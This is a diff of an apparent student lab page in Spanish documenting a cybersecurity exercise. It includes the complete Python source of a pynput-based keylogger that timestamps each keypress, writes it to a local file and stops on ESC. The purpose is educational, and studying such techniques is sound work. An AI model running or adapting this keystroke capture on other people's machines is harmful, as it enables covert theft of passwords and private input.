@@ -31,7 +31,7 @@
                 <h3>Documentación Completa</h3>
                 <p>Si deseas consultar el informe detallado de la práctica con todas las capturas de resultados y conclusiones formales, puedes descargarlo en formato PDF:</p>
                 
-                <a href="Informe_Actividad_03.pdf" download class="btn-luxury" style="display: inline-block; text-decoration: none; margin-top: 15px;">
+                <a href="Informe_Actividad_03" download class="btn-luxury" style="display: inline-block; text-decoration: none; margin-top: 15px;">
                     Descargar Informe PDF 📄
                 </a>
             </section>
@@ -39,14 +39,37 @@
             <section class="evidence-card">
                 <div class="card-number">01</div>
                 <h3>Objetivos de la Práctica</h3>
-                <p><strong>Objetivo General:</strong> Implementar y documentar, en un entorno de laboratorio controlado, un programa basado en event hooks y callbacks que permita registrar eventos de teclado, asociarlos temporalmente y transmitir telemetría hacia un receptor de laboratorio.</p>
+                <p><strong>Objetivo General:</strong> Implementar y documentar un programa basado en <strong>event hooks</strong> y <strong>callbacks</strong> que permita registrar eventos de teclado, asociarlos temporalmente y almacenar la telemetría generada, con el fin de comprender el funcionamiento técnico de una técnica de captura de entrada y reconocer sus implicaciones dentro de la ciberseguridad.</p>
             </section>
 
             <section class="evidence-card">
                 <div class="card-number">02</div>
-                <h3>Informe Técnico e Implementación</h3>
-                <p><strong>Desarrollo y Pruebas:</strong> En esta sección se documenta el análisis y la ejecución técnica de la práctica realizada en el laboratorio de la materia.</p>
-                <p><em>[Aquí puedes redactar o pegar los párrafos explicativos de la actividad].</em></p>
+                <h3>Desarrollo</h3>
+                <p>
+                      Se desarrolló un programa en Python utilizando la biblioteca <strong>pynput</strong> 
+                      para interceptar las pulsaciones de teclado mediante event hooks. Cada evento 
+                      registrado incluye:
+                    </p>
+                    
+                    <ul>
+                      <li><strong>Marca temporal</strong> con precisión de milisegundos.</li>
+                      <li><strong>Identificador secuencial</strong> único (evento_001, evento_002, etc.).</li>
+                      <li><strong>Nombre de la tecla</strong> pulsada (incluyendo teclas especiales).</li>
+                    </ul>
+                    
+                    <p>
+                      La información se almacena de forma persistente en un archivo local 
+                      (<code>registro_teclas.txt</code>) mediante escritura en modo append, garantizando 
+                      que los registros no se pierdan al finalizar la ejecución. El programa se detiene 
+                      de forma controlada al detectar la tecla <strong>ESC</strong>.
+                    </p>
+                    
+                    <p>
+                      Esta implementación permite determinar <em>cuándo</em> ocurrió cada evento, 
+                      <em>en qué orden</em> y <em>cuánto tiempo</em> transcurrió entre ellos, cumpliendo 
+                      los requisitos de persistencia del registro y asociación temporal solicitados 
+                      en la actividad.
+                    </p>
             </section>
 
             <section class="evidence-card">
@@ -56,9 +79,66 @@
                 
                 <pre style="background-color: #f4f0f4; padding: 20px; border-radius: 4px; overflow-x: auto; font-family: monospace; font-size: 0.85rem; color: var(--text-main);">
 <code>
-# Pega aquí el código fuente de tu Actividad 03
+import os
+from datetime import datetime
+from pynput.keyboard import Key, Listener
+
+directorio_script = os.path.dirname(os.path.abspath(__file__))
+log_file = os.path.join(directorio_script, "registro_teclas.txt")
+
+contador_eventos = 0
+
+def obtener_nombre_tecla(key):
+    try:
+        if key.char is not None:
+            return key.char
+        return str(key).replace("Key.", "")
+    except AttributeError:
+        return str(key).replace("Key.", "")
+
+def on_press(key):
+    global contador_eventos
+    contador_eventos += 1
+    
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    
+    id_evento = f"evento_{contador_eventos:03d}"
+    
+    tecla = obtener_nombre_tecla(key)
+    
+    linea_log = f"{timestamp} | PRESS | {id_evento} [{tecla}]\n"
+    
+    with open(log_file, "a", encoding="utf-8") as f:
+        f.write(linea_log)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+print("--> Registrando eventos con marca temporal. Presiona ESC para salir.")
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 </code>
                 </pre>
+            </section>
+
+            <section class="evidence-card">
+                <div class="card-number">04</div>
+                <h3>Conclusiones</h3>
+                <p>
+                      Se implementó exitosamente un registrador de eventos de teclado basado en event 
+                      hooks. El programa cumple con los requisitos de <strong>persistencia del registro</strong> 
+                      y <strong>asociación temporal</strong>, permitiendo reconstruir la secuencia exacta 
+                      de interacción del usuario a partir de timestamps e identificadores secuenciales.
+                    </p>
+                    
+                    <p>
+                      La actividad permitió comprender de forma práctica el funcionamiento técnico de 
+                      una técnica clásica de captura de entrada y sus implicaciones en ciberseguridad: 
+                      la facilidad de implementación, la discreción del proceso y la riqueza de 
+                      información que puede obtenerse a partir de una simple secuencia de pulsaciones.
+                    </p>
             </section>
 
         </main>
